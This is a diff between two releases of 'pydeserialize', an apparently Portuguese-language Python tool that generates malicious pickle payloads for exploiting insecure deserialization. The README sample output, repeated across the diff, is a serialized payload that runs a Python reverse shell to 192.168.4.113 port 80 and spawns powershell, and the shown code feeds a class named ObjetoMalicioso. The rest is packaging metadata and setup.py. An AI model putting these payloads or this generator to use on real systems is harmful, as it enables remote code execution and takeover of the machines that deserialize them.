+    parse.add_argument("-ip",action="store",type=str,dest="ip",required=True, help="Insert ip")
+    parse.add_argument("-p",action="store",type=str,dest="port",required=True, help="Insert port")
+    parse.add_argument("-e",action="store",type=str,dest="encode",choices=["b64","shell","urlencode","hex"],default="",required=True,help="Insert encoding")
+    parse.add_argument("-o",action="store",type=str,dest="SO",choices=["Windows","Linux"],required=True,help="Insert operational system")
+    args = parse.parse_args()
+    
     ObjetoMalicioso(args.ip,args.port,args.encode,args.SO).Objeto_Serializado()
```

### Comparing `pydeserialize-0.0.7/pydeserialize.egg-info/PKG-INFO` & `pydeserialize-0.0.8/pydeserialize.egg-info/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,106 +1,106 @@
-Metadata-Version: 2.1
-Name: pydeserialize
-Version: 0.0.7
-Summary: Insecure deserialization in python
-Home-page: https://github.com/joaoviictorti/pyserialize
-Author: joaoviictorti (viictorjj)
-Author-email: joaovictorti08@gmail.com
-License: MIT License
-Keywords: serialize insegura desserialize
-Classifier: Development Status :: 5 - Production/Stable
-Classifier: Environment :: Console
-Classifier: Intended Audience :: System Administrators
-Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
-Classifier: Natural Language :: English
-Classifier: Operating System :: OS Independent
-Classifier: Programming Language :: Python
-Classifier: Programming Language :: Python :: 3
-Classifier: Programming Language :: Python :: 3.8
-Classifier: Programming Language :: Python :: 3.9
-Classifier: Programming Language :: Python :: 3.10
-Classifier: Programming Language :: Python :: 3.11
-Classifier: Programming Language :: Python :: 3 :: Only
-Classifier: Programming Language :: Python :: Implementation :: PyPy
-Classifier: Topic :: Security
-Classifier: Topic :: System :: Networking
-Classifier: Topic :: System :: Operating System
-Classifier: Topic :: System :: Systems Administration
-Classifier: Topic :: Utilities
-Requires-Python: >=3.6, <4
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
-
-[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)](https://git.io/typing-svg)
-
-
-
-<h4 align="center">Tool for testing python insecure deserialization vulnerabilities</h4>
-
-
-<p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-pydeserialize">Usage</a>
-</p>
-
----
-
-
-O pydeserialize é uma ferramenta que gera payloads de desserialização insegura em python. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. pydeserialize é construído para fazer apenas uma coisa - gera payloads de desserialização insegura + encodes e faz isso muito bem.
-
-Projetei o `pydeserialize` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
-
-# Características
-
- - Gera payloads para explora vulnerabilidades de desserialização insegura em python    
-
-# Forma de utilização
-
-```sh
-pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
-pydeserialize -ip 192.168.4.113 -e b64-p 80 -o Linux
-```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
-```yaml
-           _                 _     _ _         
- ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
-| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
-|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
-|_| |___|  
-     v0.0.7 - @joaoviictorti     
-
-options:
-  -h, --help            show this help message and exit
-  -ip IP                Insert ip
-  -p PORT               Insert port
-  -e {b64,shell,urlencode,hex} Insert encoding
-  -o {Windows,Linux}    Insert operational system
-```
-
-# Instalação
-
-pydeserialize requer **python3** e para baixá-lo só usar:
-
-```sh
-pip3 install pydeserialize
-```
-
-# Executando pydeserialize
-
-```console
-pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell
-
-           _                 _     _ _         
- ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
-| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
-|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
-|_| |___|  
-     v0.0.7 - @joaoviictorti     
-
-b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
-```
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
+Metadata-Version: 2.1
+Name: pydeserialize
+Version: 0.0.8
+Summary: Insecure deserialization in python
+Home-page: https://github.com/joaoviictorti/pyserialize
+Author: joaoviictorti (viictorjj)
+Author-email: joaovictorti08@gmail.com
+License: MIT License
+Keywords: serialize insegura desserialize
+Classifier: Development Status :: 5 - Production/Stable
+Classifier: Environment :: Console
+Classifier: Intended Audience :: System Administrators
+Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
+Classifier: Natural Language :: English
+Classifier: Operating System :: OS Independent
+Classifier: Programming Language :: Python
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Programming Language :: Python :: 3 :: Only
+Classifier: Programming Language :: Python :: Implementation :: PyPy
+Classifier: Topic :: Security
+Classifier: Topic :: System :: Networking
+Classifier: Topic :: System :: Operating System
+Classifier: Topic :: System :: Systems Administration
+Classifier: Topic :: Utilities
+Requires-Python: >=3.6, <4
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
+
+[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)](https://git.io/typing-svg)
+
+
+
+<h4 align="center">Tool for testing python insecure deserialization vulnerabilities</h4>
+
+
+<p align="center">
+  <a href="#características">Features</a> •
+  <a href="#instalação">Install</a> •
+  <a href="#forma-de-utilização">How to use</a> •
+  <a href="#executando-pydeserialize">Usage</a>
+</p>
+
+---
+
+
+O pydeserialize é uma ferramenta que gera payloads de desserialização insegura em python. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. pydeserialize é construído para fazer apenas uma coisa - gera payloads de desserialização insegura + encodes e faz isso muito bem.
+
+Projetei o `pydeserialize` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
+
+# Características
+
+ - Gera payloads para explora vulnerabilidades de desserialização insegura em python    
+
+# Forma de utilização
+
+```sh
+pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
+pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux
+```
+Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
+```yaml
+           _                 _     _ _         
+ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
+| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
+|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
+|_| |___|  
+     v0.0.8 - @joaoviictorti
+
+options:
+  -h, --help            show this help message and exit
+  -ip IP                Insert ip
+  -p PORT               Insert port
+  -e {b64,shell,urlencode,hex} Insert encoding
+  -o {Windows,Linux}    Insert operational system
+```
+
+# Instalação
+
+pydeserialize requer **python3** e para baixá-lo só usar:
+
+```sh
+pip3 install pydeserialize
+```
+
+# Executando pydeserialize
+
+```console
+pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell
+
+           _                 _     _ _         
+ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
+| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
+|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
+|_| |___|  
+     v0.0.8 - @joaoviictorti
+
+b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
+```
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: pydeserialize Version: 0.0.7 Summary: Insecure
+Metadata-Version: 2.1 Name: pydeserialize Version: 0.0.8 Summary: Insecure
 deserialization in python Home-page: https://github.com/joaoviictorti/
 pyserialize Author: joaoviictorti (viictorjj) Author-email:
 joaovictorti08@gmail.com License: MIT License Keywords: serialize insegura
 desserialize Classifier: Development Status :: 5 - Production/Stable
 Classifier: Environment :: Console Classifier: Intended Audience :: System
 Administrators Classifier: License :: OSI Approved :: GNU General Public
 License v3 (GPLv3) Classifier: Natural Language :: English Classifier:
@@ -29,25 +29,25 @@
 pydeserialize Ã© construÃ­do para fazer apenas uma coisa - gera payloads de
 desserializaÃ§Ã£o insegura + encodes e faz isso muito bem. Projetei o
 `pydeserialize` para cumprir todas as responsabilidades para gera payloads e
 encodes, mantive um modelo consistentemente passivo para tornÃ¡-lo Ãºtil para
 testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera payloads para explora
 vulnerabilidades de desserializaÃ§Ã£o insegura em python # Forma de
 utilizaÃ§Ã£o ```sh pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
-pydeserialize -ip 192.168.4.113 -e b64-p 80 -o Linux ``` Isso exibirÃ¡ a ajuda
+pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux ``` Isso exibirÃ¡ a ajuda
 para a ferramenta. Aqui estÃ£o todos os switches que ele suporta: ```yaml _ _ _
 _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . | | | . | -_|_ -| -_| _| |
-.'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___| v0.0.7
+.'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___| v0.0.8
 - @joaoviictorti options: -h, --help show this help message and exit -ip IP
 Insert ip -p PORT Insert port -e {b64,shell,urlencode,hex} Insert encoding -o
 {Windows,Linux} Insert operational system ``` # InstalaÃ§Ã£o pydeserialize
 requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install pydeserialize
 ``` # Executando pydeserialize ```console pydeserialize -ip 192.168.4.113 -p 80
 -o Windows -e shell _ _ _ _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . |
 | | . | -_|_ -| -_| _| | .'| | |- _| -_| | _|_ |___|___|___|___|_|
-|_|__,|_|_|___|___| |_| |___| v0.0.7 - @joaoviictorti
+|_|__,|_|_|___|___| |_| |___| v0.0.8 - @joaoviictorti
 b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python
 -c \'import socket,subprocess,os;s=socket.socket
 (socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2
 (s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;
 pty.spawn("powershell")\'\x94\x85\x94R\x94.' ``` [https://capsule-
 render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `pydeserialize-0.0.7/setup.py` & `pydeserialize-0.0.8/setup.py`

 * *Files 26% similar despite different names*

```diff
@@ -1,61 +1,60 @@
-#!/usr/bin/python3
-# -*- coding: UTF-8 -*-
-
-from setuptools import setup, find_packages
-import os,sys
-
-meta = {}
-here = os.path.abspath(os.path.dirname(__file__))
-
-with open(f"{here}/pydeserialize/__meta__.py") as arquivo:
-    exec(arquivo.read(), meta)
-
-with open(f"{here}/requirements.txt", "r", encoding="utf-8") as f:
-    requires = f.read().splitlines()
-    if not requires:
-        print("Não foi possível ler os requisitos do arquivo requirements.txt"
-              "Isso indica que esta cópia do código-fonte está incompleta.")
-        sys.exit(2)
-
-with open("README.md", "r",encoding="utf-8") as arq:
-    readme = arq.read()
-
-setup(name=meta["__title__"],
-    version=meta["__version__"],
-    license='MIT License',
-    author=meta["__author__"],
-    url=meta["__url__"],
-    long_description=readme,
-    long_description_content_type="text/markdown",
-    author_email=meta["__author_email__"],
-    keywords='serialize insegura desserialize   ',
-    description=meta["__description__"],
-    packages=find_packages(),
-    zip_safe=False,
-    install_requires=requires,
-    python_requires=">=3.6, <4",
-    classifiers=[
-        "Development Status :: 5 - Production/Stable",
-        "Environment :: Console",
-        "Intended Audience :: System Administrators",
-        "License :: OSI Approved :: GNU General Public License v3 (GPLv3)",
-        "Natural Language :: English",
-        "Operating System :: OS Independent",
-        "Programming Language :: Python",
-        "Programming Language :: Python :: 3",
-        "Programming Language :: Python :: 3.8",
-        "Programming Language :: Python :: 3.9",
-        "Programming Language :: Python :: 3.10",
-        "Programming Language :: Python :: 3.11",
-        "Programming Language :: Python :: 3 :: Only",
-        "Programming Language :: Python :: Implementation :: PyPy",
-        "Topic :: Security",
-        "Topic :: System :: Networking",
-        "Topic :: System :: Operating System",
-        "Topic :: System :: Systems Administration",
-        "Topic :: Utilities"
-    ],
-    entry_points={'console_scripts': [
-        'pydeserialize=pydeserialize.pydeserialize:argumentos',
-        ]
+#!/usr/bin/python3
+# -*- coding: UTF-8 -*-
+from setuptools import setup, find_packages
+import os,sys
+
+meta = {}
+here = os.path.abspath(os.path.dirname(__file__))
+
+with open(f"{here}/pydeserialize/__meta__.py") as arquivo:
+    exec(arquivo.read(), meta)
+
+with open(f"{here}/requirements.txt", "r", encoding="utf-8") as f:
+    requires = f.read().splitlines()
+    if not requires:
+        print("Não foi possível ler os requisitos do arquivo requirements.txt"
+              "Isso indica que esta cópia do código-fonte está incompleta.")
+        sys.exit(2)
+
+with open("README.md", "r",encoding="utf-8") as arq:
+    readme = arq.read()
+
+setup(name=meta["__title__"],
+    version=meta["__version__"],
+    license='MIT License',
+    author=meta["__author__"],
+    url=meta["__url__"],
+    long_description=readme,
+    long_description_content_type="text/markdown",
+    author_email=meta["__author_email__"],
+    keywords='serialize insegura desserialize   ',
+    description=meta["__description__"],
+    packages=find_packages(),
+    zip_safe=False,
+    install_requires=requires,
+    python_requires=">=3.6, <4",
+    classifiers=[
+        "Development Status :: 5 - Production/Stable",
+        "Environment :: Console",
+        "Intended Audience :: System Administrators",
+        "License :: OSI Approved :: GNU General Public License v3 (GPLv3)",
+        "Natural Language :: English",
+        "Operating System :: OS Independent",
+        "Programming Language :: Python",
+        "Programming Language :: Python :: 3",
+        "Programming Language :: Python :: 3.8",
+        "Programming Language :: Python :: 3.9",
+        "Programming Language :: Python :: 3.10",
+        "Programming Language :: Python :: 3.11",
+        "Programming Language :: Python :: 3 :: Only",
+        "Programming Language :: Python :: Implementation :: PyPy",
+        "Topic :: Security",
+        "Topic :: System :: Networking",
+        "Topic :: System :: Operating System",
+        "Topic :: System :: Systems Administration",
+        "Topic :: Utilities"
+    ],
+    entry_points={'console_scripts': [
+        'pydeserialize=pydeserialize.pydeserialize:argumentos',
+        ]
     })
```

